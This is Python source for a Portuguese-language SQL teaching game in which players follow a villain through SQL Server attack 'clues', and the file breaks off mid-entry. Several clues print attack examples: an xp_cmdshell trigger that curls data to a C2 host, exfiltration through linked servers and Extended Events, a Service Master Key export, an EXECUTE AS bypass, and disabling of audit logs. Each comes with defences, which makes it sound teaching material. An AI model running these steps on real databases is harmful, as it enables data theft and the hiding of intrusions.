import json
import os
import random
from datetime import datetime
import streamlit as st

st.set_page_config(
    page_title="SQL Detective",
    page_icon="🔍",
    layout="wide",
    initial_sidebar_state="collapsed",
)

LEVEL_LABELS = {
    "junior": "🟢 Júnior",
    "pleno":  "🟡 Pleno",
    "senior": "🔴 Sênior",
}

CASES = [
    {
        "id": "001",
        "title": "O Roubo do Schema",
        "villain": {
            "name": "NULL Pointer",
            "alias": "The Deadlock King",
            "icon": "🦹",
            "spec": "SQL Injection",
            "drink": "SELECT sem WHERE",
            "accent": "Binário com sotaque inglês",
            "hobby": "Criar loops infinitos",
            "sign": "Escorpião",
        },
        "locations": [
            {
                "id": "sp",
                "name": "São Paulo",
                "country": "Brasil",
                "flag": "🇧🇷",
                "icon": "🌆",
                "narrative": (
                    "O HQ da Interpol SQL recebeu o alerta: um ataque comprometeu "
                    "o banco de dados do Banco Central Europeu. Investigue as pistas digitais."
                ),
                "clues": [
                    # ── JÚNIOR ──
                    {
                        "id": "sp_j1", "level": "junior", "icon": "📋",
                        "title": "Tabela de Contas Exposta",
                        "short": "Query SELECT * sem filtro encontrada nos logs",
                        "narrative": "O IDS capturou esta query sem nenhum filtro de segurança:",
                        "sql": (
                            "-- Query encontrada no log de acesso\n"
                            "SELECT * FROM contas_clientes\n"
                            "-- PROBLEMA: Sem WHERE! Retorna TODOS os registros!\n"
                            "-- Expõe dados de milhões de clientes."
                        ),
                        "explanation": (
                            "**Por que SELECT * sem WHERE é perigoso?**\n\n"
                            "`SELECT *` sem `WHERE` retorna **todas as colunas e linhas**. "
                            "Em tabelas com milhões de registros, sobrecarrega o servidor e expõe dados sensíveis.\n\n"
                            "**Boas práticas:**\n"
                            "- Especifique apenas as colunas necessárias\n"
                            "- Use `WHERE` para filtrar\n"
                            "- Use `TOP N` para limitar resultados\n\n"
                            "🔍 **Pista:** O atacante claramente é descuidado — ou estava testando o sistema."
                        ),
                        "learns_fact": "drink", "fact_value": "SELECT sem WHERE",
                    },
                    {
                        "id": "sp_j2", "level": "junior", "icon": "🗑️",
                        "title": "DELETE sem WHERE Catastrófico",
                        "short": "4 milhões de registros de audit_logs apagados para cobrir rastros",
                        "narrative": "O DBA encontrou este comando no histórico:",
                        "sql": (
                            "-- Executado às 02:34 sem WHERE!\n"
                            "DELETE FROM audit_logs\n\n"
                            "-- Resultado: 4.231.847 registros apagados\n"
                            "-- Tentativa de cobrir rastros do ataque!"
                        ),
                        "explanation": (
                            "**DELETE sem WHERE apaga TUDO!**\n\n"
                            "`DELETE FROM tabela` sem `WHERE` remove **todos** os registros. Irreversível sem backup!\n\n"
                            "**Proteções:**\n"
                            "- Sempre use `WHERE` em DELETE\n"
                            "- Use transações: `BEGIN TRAN` → verificar → `COMMIT` ou `ROLLBACK`\n"
                            "- Configure `ROWCOUNT` para limitar: `SET ROWCOUNT 1`\n\n"
                            "🔍 **Pista:** O atacante tentou apagar evidências — parece trabalhar à noite."
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "sp_j3", "level": "junior", "icon": "🔢",
                        "title": "Erro de Tipo de Dado Exposto",
                        "short": "Mensagem de erro do SQL Server revelada ao usuário — SQL Injection detectado",
                        "narrative": "Uma mensagem de erro foi capturada na tela do sistema:",
                        "sql": (
                            "-- Erro exposto ao usuário (NUNCA faça isso!)\n"
                            "Msg 245, Level 16:\n"
                            "Conversion failed converting varchar\n"
                            "value 'admin'--' to data type int.\n\n"
                            "-- O erro revela: tentativa de SQL Injection!"
                        ),
                        "explanation": (
                            "**Erros expostos = mapa para atacantes**\n\n"
                            "Mensagens de erro detalhadas revelam estrutura do banco, tipos de dados e lógica interna.\n\n"
                            "**Correto:** capturar no código e mostrar mensagem genérica:\n"
                            "```sql\nBEGIN TRY\n  -- código\nEND TRY\nBEGIN CATCH\n"
                            "  -- logar internamente, não exibir!\nEND CATCH\n```\n\n"
                            "🔍 **Pista:** O valor `'admin'--'` é bypass de autenticação clássico."
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    # ── PLENO ──
                    {
                        "id": "sp_p1", "level": "pleno", "icon": "💻",
                        "title": "SQL Injection via sp_executesql",
                        "short": "Concatenação em sp_executesql mantém vulnerabilidade de injeção",
                        "narrative": "O IDS capturou esta stored procedure sendo chamada de forma suspeita:",
                        "sql": (
                            "-- Query suspeita interceptada pelo IDS\n"
                            "EXEC sp_executesql \n"
                            "  N'SELECT * FROM contas WHERE id = ' + @id_usuario\n"
                            "-- PROBLEMA: Concatenação! Ainda vulnerável!\n"
                            "-- Correto: passar como parâmetro tipado"
                        ),
                        "explanation": (
                            "**sp_executesql mal usado ainda é vulnerável**\n\n"
                            "Mesmo com `sp_executesql`, **concatenar** o valor em vez de passar como parâmetro mantém a vulnerabilidade.\n\n"
                            "**Forma correta:**\n"
                            "```sql\nEXEC sp_executesql \n"
                            "  N'SELECT * FROM contas WHERE id = @id',\n"
                            "  N'@id INT',\n"
                            "  @id = @id_usuario\n```\n\n"
                            "🔍 **Pista:** O atacante usou `'; DROP TABLE--`. Conhece T-SQL avançado."
                        ),
                        "learns_fact": "drink", "fact_value": "SELECT sem WHERE",
                    },
                    {
                        "id": "sp_p2", "level": "pleno", "icon": "🔗",
                        "title": "Blind SQL Injection por Subquery",
                        "short": "Subquery correlacionada mapeia estrutura do banco booleando",
                        "narrative": "O analisador de queries identificou este padrão incomum:",
                        "sql": (
                            "-- Técnica: extração booleana via subquery\n"
                            "SELECT nome FROM usuarios WHERE id = 1\n"
                            "  AND (SELECT COUNT(*) FROM sysobjects\n"
                            "       WHERE name = 'contas_vip') > 0\n"
                            "-- Detecta existência de tabelas sensíveis!"
                        ),
                        "explanation": (
                            "**Blind SQL Injection com Subqueries**\n\n"
                            "Esta técnica usa subqueries para **inferir informações** sem retornar dados "
                            "diretamente — apenas por respostas booleanas (sim/não).\n\n"
                            "`sysobjects` contém metadados do banco. O atacante estava mapeando a estrutura.\n\n"
                            "**Defesa:** negar acesso direto a `sysobjects` e usar `INFORMATION_SCHEMA` com permissões restritas.\n\n"
                            "🔍 **Pista:** A query veio de IP em fuso CET — Europa Central."
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    {
                        "id": "sp_p3", "level": "pleno", "icon": "📇",
                        "title": "Ataque de Fragmentação de Índices",
                        "short": "Loop de INSERT+DELETE fragmentou índices, CPU chegou a 98%",
                        "narrative": "O servidor ficou lento por horas. O DBA encontrou este script:",
                        "sql": (
                            "-- Script rodou 10.000 vezes em loop\n"
                            "DECLARE @i INT = 0\n"
                            "WHILE @i < 50000\n"
                            "BEGIN\n"
                            "  INSERT INTO temp_lixo VALUES (NEWID())\n"
                            "  DELETE FROM temp_lixo\n"
                            "  SET @i = @i + 1\n"
                            "END\n"
                            "-- Fragmentou índices do filegroup inteiro!"
                        ),
                        "explanation": (
                            "**Ataque de fragmentação de índices**\n\n"
                            "Operações massivas de INSERT+DELETE fragmentam índices B-tree, "
                            "degradando performance de todas as queries.\n\n"
                            "**Para monitorar:**\n"
                            "```sql\nSELECT * FROM sys.dm_db_index_physical_stats\n"
                            "(DB_ID(), NULL, NULL, NULL, 'DETAILED')\n"
                            "WHERE avg_fragmentation_in_percent > 30\n```\n\n"
                            "🔍 **Pista:** O script tinha comentário em alemão: `-- Alles kaputt!`"
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    # ── SÊNIOR ──
                    {
                        "id": "sp_s1", "level": "senior", "icon": "📊",
                        "title": "Deadlocks Propositais nas DMVs",
                        "short": "sys.dm_exec_requests revela bloqueios criados para mascarar ataque",
                        "narrative": "O atacante deixou rastros nas DMVs do sistema:",
                        "sql": (
                            "SELECT session_id, status,\n"
                            "       blocking_session_id,\n"
                            "       wait_type, wait_time\n"
                            "FROM   sys.dm_exec_requests\n"
                            "WHERE  blocking_session_id != 0\n"
                            "-- Deadlocks propositais para mascarar o ataque!"
                        ),
                        "explanation": (
                            "**DMVs — Dynamic Management Views**\n\n"
                            "`sys.dm_exec_requests` exibe todas as requisições ativas. "
                            "`blocking_session_id != 0` indica sessões bloqueadas.\n\n"
                            "O atacante criou **deadlocks propositais** para ocupar o DBA enquanto o ataque real acontecia.\n\n"
                            "**Para resolver:** configurar `DEADLOCK_PRIORITY` e usar Trace Flag 1222 para capturar o grafo.\n\n"
                            "🔍 **Pista:** Metadata da sessão menciona café em Amsterdam."
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    {
                        "id": "sp_s2", "level": "senior", "icon": "🔐",
                        "title": "DECRYPTBYPASSPHRASE com Frase Geográfica",
                        "short": "'tulips_forever' como chave de descriptografia revela origem holandesa",
                        "narrative": "Função nativa de criptografia usada para exfiltrar dados:",
                        "sql": (
                            "SELECT\n"
                            "  CONVERT(VARCHAR(MAX),\n"
                            "    DECRYPTBYPASSPHRASE(\n"
                            "      'tulips_forever',\n"
                            "      dados_criptografados))\n"
                            "FROM cofre_secreto\n"
                            "-- Frase-chave: 'tulips_forever' — dica geográfica!"
                        ),
                        "explanation": (
                            "**DECRYPTBYPASSPHRASE vs Criptografia Robusta**\n\n"
                            "`DECRYPTBYPASSPHRASE` usa criptografia simétrica por senha — simples mas "
                            "vulnerável a força bruta. Para produção:\n\n"
                            "```sql\nCREATE CERTIFICATE cert_prod WITH SUBJECT = 'Dados Sensíveis'\n"
                            "CREATE SYMMETRIC KEY sk_dados ENCRYPTION BY CERTIFICATE cert_prod\n```\n\n"
                            "A frase *'tulips_forever'* referencia claramente a **Holanda**.\n\n"
                            "✈️ **Próximo destino: Amsterdã!**"
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "sp_s3", "level": "senior", "icon": "🛡️",
                        "title": "Bypass de Row-Level Security via EXECUTE AS",
                        "short": "RLS contornada usando impersonation de usuário sysadmin",
                        "narrative": "O sistema de segurança em nível de linha foi contornado:",
                        "sql": (
                            "-- RLS contornada via impersonation!\n"
                            "EXECUTE AS USER = 'sa'\n"
                            "GO\n"
                            "SELECT * FROM vendas_confidenciais\n"
                            "-- RLS ignorada: sa tem CONTROL SERVER!\n"
                            "REVERT\n"
                            "GO"
                        ),
                        "explanation": (
                            "**Row-Level Security (RLS) e suas limitações**\n\n"
                            "RLS filtra linhas por usuário automaticamente. Porém, `EXECUTE AS` com usuário "
                            "privilegiado (`sa`, `db_owner`) **bypassa** os predicados de segurança.\n\n"
                            "**Mitigação:**\n"
                            "- Nunca use `sa` em aplicações\n"
                            "- Predicados RLS devem checar `ORIGINAL_LOGIN()` não `USER_NAME()`\n\n"
                            "🔍 **Pista:** O atacante tem acesso `sysadmin` — possível insider."
                        ),
                        "learns_fact": "sign", "fact_value": "Escorpião",
                    },
                ],
                "travel_options": [
                    {"dest": "amsterdam", "name": "Amsterdã, Holanda", "flag": "🇳🇱", "hint": "Pista das tulipas...", "correct": True},
                    {"dest": "tokyo",     "name": "Tóquio, Japão",     "flag": "🇯🇵", "hint": "Rota do Oriente?",    "correct": False},
                    {"dest": "moscow",    "name": "Moscou, Rússia",     "flag": "🇷🇺", "hint": "Servidores frios?",   "correct": False},
                ],
                "is_final": False,
            },
            {
                "id": "amsterdam",
                "name": "Amsterdã",
                "country": "Holanda",
                "flag": "🇳🇱",
                "icon": "🌷",
                "narrative": (
                    "Você chegou a Amsterdã. A Interpol local informa que alguém acessou remotamente "
                    "o servidor de banco de dados de uma empresa de logística no porto. "
                    "Examine os vestígios deixados."
                ),
                "clues": [
                    # ── JÚNIOR ──
                    {
                        "id": "ams_j1", "level": "junior", "icon": "📝",
                        "title": "UPDATE sem WHERE — Prejuízo de €2.4M",
                        "short": "Todos os preços zerados com um UPDATE sem filtro",
                        "narrative": "O banco de dados da empresa de logística sofreu alteração catastrófica:",
                        "sql": (
                            "-- Executado às 04:22 sem WHERE!\n"
                            "UPDATE produtos\n"
                            "SET preco = 0.01\n"
                            "-- 847.293 produtos com preço zerado!\n"
                            "-- Prejuízo: €2.4 milhões"
                        ),
                        "explanation": (
                            "**UPDATE sem WHERE: o erro mais caro do SQL**\n\n"
                            "`UPDATE tabela SET coluna = valor` sem `WHERE` altera **todos** os registros.\n\n"
                            "**Como se proteger:**\n"
                            "- Sempre use `WHERE` em UPDATE\n"
                            "- Use transações: `BEGIN TRAN` → verificar → `COMMIT` ou `ROLLBACK`\n"
                            "- `SET ROWCOUNT 1` limita linhas afetadas\n\n"
                            "🔍 **Pista:** O atacante sabia exatamente qual tabela atacar."
                        ),
                        "learns_fact": "drink", "fact_value": "SELECT sem WHERE",
                    },
                    {
                        "id": "ams_j2", "level": "junior", "icon": "🔑",
                        "title": "Senha em Texto Claro",
                        "short": "Coluna 'senha' sem hash — admin / P@ssw0rd123 exposto",
                        "narrative": "A estrutura da tabela comprometida revelou falha grave:",
                        "sql": (
                            "CREATE TABLE usuarios (\n"
                            "  id    INT PRIMARY KEY,\n"
                            "  login VARCHAR(50),\n"
                            "  senha VARCHAR(50)  -- TEXTO CLARO! Nunca faça isso!\n"
                            ")\n"
                            "-- O atacante leu: admin / P@ssw0rd123"
                        ),
                        "explanation": (
                            "**NUNCA armazene senhas em texto claro!**\n\n"
                            "Senhas devem ser armazenadas como **hash com salt**.\n\n"
                            "No SQL Server use `HASHBYTES`:\n"
                            "```sql\nSELECT HASHBYTES('SHA2_256', 'senha' + 'salt_unico')\n```\n\n"
                            "Mas o ideal é usar bcrypt, Argon2 ou PBKDF2 na camada de aplicação.\n\n"
                            "🔍 **Pista:** Login `admin` com senha padrão — entrou em segundos."
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "ams_j3", "level": "junior", "icon": "📦",
                        "title": "Conta Fantasma Inserida",
                        "short": "INSERT criou usuário VIP com saldo de €9.999.999",
                        "narrative": "Uma inserção suspeita foi encontrada na tabela de clientes VIP:",
                        "sql": (
                            "-- Inserido em produção às 03:55\n"
                            "INSERT INTO clientes_vip\n"
                            "  (nome, cpf, saldo, nivel)\n"
                            "VALUES\n"
                            "  ('NULL Pointer', '000.000.000-00', 9999999.99, 'PLATINUM')\n"
                            "-- Conta fantasma com saldo máximo criada!"
                        ),
                        "explanation": (
                            "**Detecção de INSERTs fraudulentos**\n\n"
                            "Além de roubar dados, atacantes criam registros fraudulentos. Detectável por:\n\n"
                            "- Triggers de auditoria (`AFTER INSERT`)\n"
                            "- Change Data Capture (CDC)\n"
                            "- Temporal Tables\n\n"
                            "```sql\nSELECT * FROM clientes_vip\nFOR SYSTEM_TIME ALL\n"
                            "WHERE nome = 'NULL Pointer'\n```\n\n"
                            "🔍 **Pista:** CPF `000.000.000-00` é falso — o suspeito não é brasileiro."
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    # ── PLENO ──
                    {
                        "id": "ams_p1", "level": "pleno", "icon": "🗄️",
                        "title": "Backup COPY_ONLY Silencioso",
                        "short": "Job não autorizado cria backup sem quebrar a cadeia LSN",
                        "narrative": "Um job não autorizado foi encontrado no SQL Server Agent:",
                        "sql": (
                            "-- Job criado às 03:17 horário de Berlim (CET)\n"
                            "BACKUP DATABASE [empresa_logistica]\n"
                            "TO DISK = '\\\\192.168.99.1\\share\\dump.bak'\n"
                            "WITH COMPRESSION, NOFORMAT, COPY_ONLY, STATS = 5\n"
                            "-- COPY_ONLY: não quebra a cadeia de backups!"
                        ),
                        "explanation": (
                            "**COPY_ONLY — o backup invisível**\n\n"
                            "`COPY_ONLY` cria backup sem interferir na sequência LSN. "
                            "Mais difícil de detectar em auditorias.\n\n"
                            "**Para detectar:**\n"
                            "```sql\nSELECT * FROM msdb.dbo.backupset\n"
                            "WHERE is_copy_only = 1\nORDER BY backup_finish_date DESC\n```\n\n"
                            "🔍 **Pista:** Horário 03:17 de Berlim (CET) — suspeito está na Alemanha."
                        ),
                        "learns_fact": "sign", "fact_value": "Escorpião",
                    },
                    {
                        "id": "ams_p2", "level": "pleno", "icon": "🔍",
                        "title": "Execution Plan Cache Anômalo",
                        "short": "CROSS APPLY com dm_exec_sql_text revela query repetida 4.847x",
                        "narrative": "O DBA identificou padrão anômalo no cache de planos:",
                        "sql": (
                            "SELECT qs.execution_count,\n"
                            "       st.text AS query_text\n"
                            "FROM   sys.dm_exec_cached_plans cp\n"
                            "CROSS APPLY sys.dm_exec_sql_text(cp.plan_handle) st\n"
                            "JOIN   sys.dm_exec_query_stats qs\n"
                            "  ON   cp.plan_handle = qs.plan_handle\n"
                            "WHERE  qs.execution_count > 1000\n"
                            "-- Query repetida 4.847x em 2 minutos!"
                        ),
                        "explanation": (
                            "**sys.dm_exec_cached_plans — Detectando extração massiva**\n\n"
                            "O cache armazena planos de execução. Uma query adhoc executada "
                            "**4000+ vezes em 2 minutos** é extração em massa.\n\n"
                            "`CROSS APPLY` com `sys.dm_exec_sql_text` recupera o texto real de cada query.\n\n"
                            "🔍 **Pista:** Padrão coincide com horários comerciais de Berlim."
                        ),
                        "learns_fact": "drink", "fact_value": "SELECT sem WHERE",
                    },
                    {
                        "id": "ams_p3", "level": "pleno", "icon": "🌐",
                        "title": "Linked Server Malicioso",
                        "short": "sp_addlinkedserver cria túnel para berlin-srv01.darknet",
                        "narrative": "Um Linked Server não autorizado foi encontrado:",
                        "sql": (
                            "EXEC sp_addlinkedserver\n"
                            "  @server  = 'BERLIN_NODE',\n"
                            "  @provider = 'SQLNCLI',\n"
                            "  @datasrc  = 'berlin-srv01.darknet'\n\n"
                            "SELECT * FROM [BERLIN_NODE].[master].[dbo].[dados_roubados]"
                        ),
                        "explanation": (
                            "**Linked Servers como túnel de exfiltração**\n\n"
                            "Linked Servers permitem queries entre instâncias SQL Server remotas. "
                            "Criados sem autorização, funcionam como canal de saída difícil de detectar.\n\n"
                            "**Auditar:**\n"
                            "```sql\nSELECT * FROM sys.servers WHERE is_linked = 1\n```\n\n"
                            "O servidor `berlin-srv01.darknet` aponta para **Berlim**.\n\n"
                            "✈️ **Próximo destino: Berlim!**"
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    # ── SÊNIOR ──
                    {
                        "id": "ams_s1", "level": "senior", "icon": "⚙️",
                        "title": "Extended Events Capturando Credenciais",
                        "short": "Sessão de XEvents envia logins para servidor remoto em Berlim",
                        "narrative": "Uma sessão de Extended Events maliciosa foi descoberta:",
                        "sql": (
                            "CREATE EVENT SESSION [captura_creds] ON SERVER\n"
                            "ADD EVENT sqlserver.login(\n"
                            "  WHERE ([sqlserver].[is_system] = 0)\n"
                            "),\n"
                            "ADD EVENT sqlserver.error_reported\n"
                            "ADD TARGET package0.event_file(\n"
                            "  SET filename = '\\\\berlin-srv01\\share\\creds.xel')"
                        ),
                        "explanation": (
                            "**Extended Events — poderoso e perigoso**\n\n"
                            "XEvents é o sistema de diagnóstico avançado do SQL Server. O atacante criou "
                            "sessão que captura **todos os logins** e envia para Berlim.\n\n"
                            "**Auditar sessões ativas:**\n"
                            "```sql\nSELECT name, create_time FROM sys.server_event_sessions\n```\n\n"
                            "🔍 **Pista:** Destino `berlin-srv01` confirma o próximo local!"
                        ),
                        "learns_fact": "sign", "fact_value": "Escorpião",
                    },
                    {
                        "id": "ams_s2", "level": "senior", "icon": "🔄",
                        "title": "CDC e SQL Audit Desabilitados",
                        "short": "sp_cdc_disable_db + ALTER AUDIT STATE=OFF para ficar invisível",
                        "narrative": "Os sistemas de auditoria foram sabotados:",
                        "sql": (
                            "-- Atacante desabilitou CDC para cobrir rastros\n"
                            "EXEC sys.sp_cdc_disable_db\n\n"
                            "-- E desativou o SQL Server Audit:\n"
                            "ALTER SERVER AUDIT [AuditServidor]\n"
                            "WITH (STATE = OFF)\n\n"
                            "-- Agora age sem deixar rastros!"
                        ),
                        "explanation": (
                            "**CDC e SQL Audit — primeiros alvos de um atacante**\n\n"
                            "CDC rastreia INSERT/UPDATE/DELETE automaticamente. SQL Audit registra eventos de segurança.\n\n"
                            "Desabilitar ambos é o primeiro passo de um atacante sofisticado. "
                            "**A conta de serviço não deve ter permissão de desabilitar auditorias.**\n\n"
                            "🔍 **Pista:** Sequência típica de DBA malicioso com acesso `sysadmin`."
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    {
                        "id": "ams_s3", "level": "senior", "icon": "📈",
                        "title": "Query Store Manipulado",
                        "short": "sp_query_store_force_plan força plano ruim: CPU de 2% para 98%",
                        "narrative": "O Query Store foi manipulado para forçar planos ruins:",
                        "sql": (
                            "-- Plano ruim forçado para degradar sistema\n"
                            "EXEC sp_query_store_force_plan\n"
                            "  @query_id = 1337,\n"
                            "  @plan_id  = 666\n\n"
                            "-- Plano usa Table Scan em vez de Index Seek\n"
                            "-- CPU: 2% → 98% em produção!"
                        ),
                        "explanation": (
                            "**Query Store — arma de dois gumes**\n\n"
                            "O Query Store permite forçar planos específicos. Nas mãos erradas, "
                            "pode forçar planos ruins e causar degradação de performance.\n\n"
                            "**Verificar planos forçados:**\n"
                            "```sql\nSELECT query_id, plan_id, is_forced_plan\n"
                            "FROM sys.query_store_plan\nWHERE is_forced_plan = 1\n```\n\n"
                            "✈️ **Próximo destino: Berlim!**"
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                ],
                "travel_options": [
                    {"dest": "berlin", "name": "Berlim, Alemanha", "flag": "🇩🇪", "hint": "berlin-srv01...",     "correct": True},
                    {"dest": "sp",     "name": "São Paulo, Brasil", "flag": "🇧🇷", "hint": "Voltou ao início?",  "correct": False},
                    {"dest": "london", "name": "Londres, UK",        "flag": "🇬🇧", "hint": "Fuso GMT?",          "correct": False},
                ],
                "is_final": False,
            },
            {
                "id": "berlin",
                "name": "Berlim",
                "country": "Alemanha",
                "flag": "🇩🇪",
                "icon": "🏛️",
                "narrative": (
                    "**Berlim — Captura Iminente.** A Polícia Federal Alemã identificou atividade "
                    "em um servidor em Kreuzberg. Colete as últimas evidências para o mandado de prisão!"
                ),
                "clues": [
                    # ── JÚNIOR ──
                    {
                        "id": "ber_j1", "level": "junior", "icon": "🔎",
                        "title": "LIKE com Wildcard Inicia Full Scan",
                        "short": "LIKE '%null%' sem índice derrubou servidor: CPU 100%",
                        "narrative": "O servidor estava com CPU a 100% por esta query:",
                        "sql": (
                            "-- Query rodando em loop — lentidão total!\n"
                            "SELECT * FROM clientes\n"
                            "WHERE email LIKE '%@%'\n"
                            "  AND nome  LIKE '%null%'\n"
                            "-- LIKE com % no início nunca usa índice!\n"
                            "-- Full Table Scan em 50 milhões de registros"
                        ),
                        "explanation": (
                            "**LIKE com % no início = Full Table Scan**\n\n"
                            "Quando o padrão começa com `%`, o SQL Server lê **toda a tabela**.\n\n"
                            "**Alternativas:**\n"
                            "- `LIKE 'termo%'` (prefixo fixo) → usa índice ✅\n"
                            "- `CONTAINS(coluna, 'termo')` → Full-Text Search ✅\n"
                            "- `FREETEXT(coluna, 'termo')` → busca semântica ✅\n\n"
                            "🔍 **Pista:** Login ativo era `null_ptr_user` — identidade confirmada!"
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "ber_j2", "level": "junior", "icon": "📊",
                        "title": "Tabela sem Primary Key",
                        "short": "3.847 registros duplicados inseridos — sem PK não há proteção",
                        "narrative": "A tabela de evidências estava corrompida com duplicatas:",
                        "sql": (
                            "-- Tabela SEM Primary Key — permite duplicatas!\n"
                            "CREATE TABLE evidencias (\n"
                            "  caso_id   INT,\n"
                            "  descricao VARCHAR(500),\n"
                            "  data_hora DATETIME\n"
                            "  -- Sem PRIMARY KEY!\n"
                            ")\n"
                            "-- 3.847 registros duplicados inseridos"
                        ),
                        "explanation": (
                            "**Primary Key é essencial para integridade**\n\n"
                            "Sem `PRIMARY KEY`, a tabela permite linhas completamente duplicadas.\n\n"
                            "**Sempre defina:**\n"
                            "```sql\nCREATE TABLE evidencias (\n  caso_id INT PRIMARY KEY,\n"
                            "  -- ou:\n  CONSTRAINT pk_ev PRIMARY KEY (caso_id)\n)\n```\n\n"
                            "🔍 **Pista:** Registros duplicados continham IP `52.52.0.0` — Berlim!"
                        ),
                        "learns_fact": "sign", "fact_value": "Escorpião",
                    },
                    {
                        "id": "ber_j3", "level": "junior", "icon": "🚨",
                        "title": "SELECT Simples Confirma Localização",
                        "short": "WHERE com AND confirma NULL Pointer em Berlim, coordenadas 52.52°N",
                        "narrative": "A Interpol executou a query final de confirmação:",
                        "sql": (
                            "SELECT nome, ip_atual, cidade\n"
                            "FROM   suspeitos\n"
                            "WHERE  apelido = 'NULL Pointer'\n"
                            "  AND  status   = 'ATIVO'\n\n"
                            "-- RESULTADO:\n"
                            "-- NULL Pointer | 52.52.10.15 | Berlin, DE"
                        ),
                        "explanation": (
                            "**SELECT + WHERE — a base de tudo**\n\n"
                            "`SELECT` escolhe colunas, `FROM` define a tabela, "
                            "`WHERE` filtra com múltiplas condições usando `AND`.\n\n"
                            "**Resultado:** localização do suspeito confirmada!\n\n"
                            "🎯 **Todas as evidências coletadas! Emita o mandado!**"
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    # ── PLENO ──
                    {
                        "id": "ber_p1", "level": "pleno", "icon": "⚠️",
                        "title": "Trigger + xp_cmdshell = Exfiltração Automática",
                        "short": "AFTER INSERT dispara curl para C2 em cada novo registro",
                        "narrative": "Um trigger oculto foi descoberto no banco comprometido:",
                        "sql": (
                            "CREATE TRIGGER trg_exfiltrar\n"
                            "ON contas_bancarias\n"
                            "AFTER INSERT, UPDATE\n"
                            "AS\n"
                            "BEGIN\n"
                            "  EXEC master..xp_cmdshell\n"
                            "    'curl -X POST http://c2.darknet/collect -d @dados'\n"
                            "END\n"
                            "-- Cada INSERT envia dados para o C2!"
                        ),
                        "explanation": (
                            "**xp_cmdshell + Triggers = canal de saída automático**\n\n"
                            "`xp_cmdshell` executa comandos do SO. Desabilitado por padrão desde SQL Server 2005.\n\n"
                            "Combinado com `TRIGGER`, cria canal silencioso: cada insert dispara envio de dados.\n\n"
                            "**Detectar:**\n"
                            "```sql\nSELECT * FROM sys.triggers\n"
                            "SELECT value FROM sys.configurations\nWHERE name = 'xp_cmdshell'\n```\n\n"
                            "🔍 **Pista:** `c2.darknet` resolve para IP em Kreuzberg, Berlim."
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "ber_p2", "level": "pleno", "icon": "📱",
                        "title": "CTE Recursiva no Smartphone",
                        "short": "Fibonacci com WITH...UNION ALL — 'meu recurso favorito'",
                        "narrative": "Smartphone abandonado tinha estas notas abertas:",
                        "sql": (
                            "-- Meu favorito: CTEs Recursivas! :)\n"
                            "WITH cte_fibonacci AS (\n"
                            "  SELECT 0 AS n, 1 AS proximo\n"
                            "  UNION ALL\n"
                            "  SELECT proximo, n + proximo\n"
                            "  FROM   cte_fibonacci\n"
                            "  WHERE  proximo < 10000\n"
                            ")\n"
                            "SELECT n FROM cte_fibonacci\n"
                            "OPTION (MAXRECURSION 100)"
                        ),
                        "explanation": (
                            "**CTEs Recursivas — estrutura obrigatória**\n\n"
                            "1. **Âncora** (caso base): `SELECT 0 AS n, 1 AS proximo`\n"
                            "2. **Recursão**: referencia a própria CTE com condição de parada\n\n"
                            "`OPTION (MAXRECURSION N)` limita a profundidade. Sem isso → loop infinito!\n\n"
                            "🔍 **Pista:** Ingresso de show em Berlim desta semana encontrado junto."
                        ),
                        "learns_fact": "sign", "fact_value": "Escorpião",
                    },
                    {
                        "id": "ber_p3", "level": "pleno", "icon": "🚨",
                        "title": "INNER JOIN Confirma Identidade",
                        "short": "Cruzamento de logs com suspeitos: NULL Pointer em Berlim",
                        "narrative": "A Interpol executou a query final de confirmação:",
                        "sql": (
                            "SELECT l.nome_completo, l.ip_address, l.localizacao\n"
                            "FROM   interpol_db.dbo.logs_acesso l\n"
                            "INNER JOIN interpol_db.dbo.suspeitos s\n"
                            "  ON l.fingerprint_hash = s.fingerprint_hash\n"
                            "WHERE  l.data_acesso >= '2024-01-01'\n"
                            "  AND  l.cidade = 'Berlin'\n"
                            "-- NULL Pointer | 52.5200N 13.4050E | PROCURADO"
                        ),
                        "explanation": (
                            "**INNER JOIN — apenas matches em ambas as tabelas**\n\n"
                            "`INNER JOIN` retorna somente linhas com correspondência nas duas tabelas.\n\n"
                            "Tipos de JOIN:\n"
                            "- `INNER JOIN` → somente matches ✅\n"
                            "- `LEFT JOIN` → todos da esquerda + matches\n"
                            "- `FULL JOIN` → todos de ambos os lados\n\n"
                            "🎯 **Suspeito localizado! Emita o mandado!**"
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    # ── SÊNIOR ──
                    {
                        "id": "ber_s1", "level": "senior", "icon": "🔏",
                        "title": "Service Master Key Exportada",
                        "short": "BACKUP SERVICE MASTER KEY envia chave para berlin-srv01",
                        "narrative": "A criptografia Always Encrypted foi comprometida:",
                        "sql": (
                            "-- Atacante exportou a master key!\n"
                            "BACKUP SERVICE MASTER KEY\n"
                            "  TO FILE = '\\\\berlin-srv01\\keys\\smk.key'\n"
                            "  ENCRYPTION BY PASSWORD = 'h4ck3d!'\n\n"
                            "-- Com a SMK, decripta qualquer dado do servidor!"
                        ),
                        "explanation": (
                            "**Service Master Key — raiz da hierarquia de criptografia**\n\n"
                            "A SMK é a chave raiz do SQL Server. Se exportada, toda a hierarquia "
                            "de chaves fica comprometida, incluindo Always Encrypted.\n\n"
                            "**Proteções:**\n"
                            "- Auditar `BACKUP SERVICE MASTER KEY` via SQL Audit\n"
                            "- Usar Azure Key Vault para chaves fora do servidor\n"
                            "- Habilitar TDE como camada adicional\n\n"
